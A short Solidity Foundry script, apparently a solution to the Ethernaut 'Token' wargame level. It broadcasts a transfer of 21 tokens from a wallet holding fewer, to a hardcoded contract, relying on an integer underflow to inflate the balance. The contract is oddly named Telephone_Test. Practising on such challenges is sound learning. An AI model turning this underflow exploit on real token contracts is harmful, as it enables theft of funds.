// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "ethernaut/Token/Token.sol";
import "forge-std/Test.sol";
import "./EthernautTestHelpers.sol";

contract Telephone_Test is Test, EthernautTestHelpers {
    function run() public {
        uint256 PKEY = vm.envUint("DEPLOYMENT_KEY");
        vm.startBroadcast(PKEY);
        Token token = Token(0x247877eE0Fcd33c127350735f197b6bB891D5494);
        uint balance = token.balanceOf(TEST_WALLET_MAIN);
        console.log("Balance: %s", balance);

        token.transfer(address(this), 21);
        balance = token.balanceOf(TEST_WALLET_MAIN);
        console.log("Balance: %s", balance);
        vm.stopBroadcast();
    }
}
